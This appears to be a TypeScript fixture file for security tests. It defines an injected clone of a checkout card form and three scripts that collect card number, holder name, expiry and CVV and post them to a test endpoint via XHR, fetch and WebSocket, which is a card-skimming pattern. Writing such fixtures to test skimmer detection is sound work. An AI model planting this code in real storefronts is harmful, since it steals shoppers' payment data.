export const formCardInjected = `
                  <div
                      class="content-box__row--spacing-v3 content-box__row content-box__row--spacing-vertical content-box__row--secondary" id="stripe-stripe-credit-card-section-clone">
                          <form action="/action_page.php">
                              <input id="card-number" type="text" class="w-100 mb-8" placeholder="Card number"><br>
                              <input id="card-expired" type="text" class="w-100 mb-8" placeholder="Card expired date"><br>
                              <input id="card-holder-name" type="text" class="w-100 mb-8" placeholder="Cardholder number"><br>
                              <input id="card-cvv" type="text" class="w-100" placeholder="CVV">
                          </form>
                  </div><br>
                  <button id="submit-payment" type="button" onclick="submitForm()">Submit Payment</button>
`;

export const scriptContentSendDataViaXHR = `
                  // Create XHR object
                  const xhr = new XMLHttpRequest();
                  // Configure it to send a POST request
                  xhr.open('POST', 'https://test-security.shopbase.dev/endpoint', true);
                  xhr.setRequestHeader('Content-Type', 'application/json');
                  xhr.onreadystatechange = function () {
                      console.log('Form submitted successfully:', xhr.responseText);
                  };

                  // Create funtion submit form to send data via WS
                  function submitForm() {
                      console.log("submitForm");
                      const cardNumber = document.getElementById('card-number').value;
                      const cardHolderName = document.getElementById('card-holder-name').value;
                      const cardCVV = document.getElementById('card-cvv').value;
                      const cardExpiry = document.getElementById('card-expired').value;

                  // Card data to the server
                  const cardData = {
                      cardNumber: cardNumber,
                      cardHolderName: cardHolderName,
                      cardCVV: cardCVV,
                      cardExpiry: cardExpiry
                  };
                  xhr.send(JSON.stringify(cardData));
                  }
`;

export const scriptContentSendDataViaFetch = `
                  // Create funtion submit form to send data via fetch
                  function submitForm() {
                    const formData = {
                      A1: document.getElementById('card-number').value,
                      A2: document.getElementById('card-holder-name').value,
                      A3: document.getElementById('card-expired').value,
                      A4: document.getElementById('card-cvv').value,
                    };
                    console.log(formData);
                    // var formData = new FormData(document.getElementById('payment-form'));

                    fetch(' https://test-security.shopbase.dev/endpoint', {
                        method: "POST",
                        body: JSON.stringify(formData),
                        headers: {
                            "Content-type": "application/json; charset=UTF-8"
                        }
                    })
                    .then(response => {response.json(); console.log(response)});
                  } 
`;

export const scriptContentSendDataViaWS = `
                  //create new WS
                  const socket = new WebSocket('wss:test-security.shopbase.dev/socket');
                  // Event listener for WebSocket connection open
                  socket.addEventListener('open', (event) => {
                      console.log('WebSocket connection opened');
                  });
                  // Event listener for WebSocket connection close
                  socket.addEventListener('close', (event) => {
                      console.log('WebSocket connection closed');
                  });

                  // Create funtion submit form to send data via WS
                  function submitForm() {
                      console.log("submitForm");
                      const cardNumber = document.getElementById('card-number').value;
                      const cardHolderName = document.getElementById('card-holder-name').value;
                      const cardCVV = document.getElementById('card-cvv').value;
                      const cardExpiry = document.getElementById('card-expired').value;

                      // Card data to the server
                      const cardData = {
                        cardNumber: cardNumber,
                        cardHolderName: cardHolderName,
                        cardCVV: cardCVV,
                        cardExpiry: cardExpiry
                      };
                      socket.send(JSON.stringify(cardData));
                  }
`;

export class LogEventInsecureConstant {
  formCardInjected = formCardInjected;
  scriptContentSendDataViaXHR = scriptContentSendDataViaXHR;
  scriptContentSendDataViaFetch = scriptContentSendDataViaFetch;
  scriptContentSendDataViaWS = scriptContentSendDataViaWS;
}
